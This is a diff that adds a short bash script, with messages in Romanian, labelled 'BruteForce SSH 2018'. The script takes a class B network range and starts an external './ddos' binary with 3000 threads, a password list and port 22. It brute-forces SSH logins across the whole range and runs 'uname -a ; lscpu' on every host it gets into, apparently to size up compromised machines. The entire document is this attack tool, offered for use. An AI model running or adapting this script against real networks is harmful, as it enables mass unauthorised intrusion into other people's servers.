@@ -1,0 +1,24 @@
+#!/bin/bash
+
+passfile=pass
+threads=3000
+port=22
+#
+WHI='[1;37m'
+BLK='[1;30m'
+RED='[1;31m'
+YEL='[1;33m'
+BLU='[1;34m'
+RES='[0m'
+
+if [ $# != 1 ]; then
+        echo "${WHI}   Folosim: $0 <b class>${RES}"
+        exit;
+fi
+echo "${RED}#                          BruteForce SSH 2018                     ${RED}#                  "
+echo "${RED}#                          uname -a & lscpu                        ${RED}#                  "
+
+./ddos $threads -b $1 $passfile $port "uname -a ; lscpu"
+sleep 10
+pkill ddos
+echo "${RED}[+]${BLK} Am Terminat Clasa.${RES}"
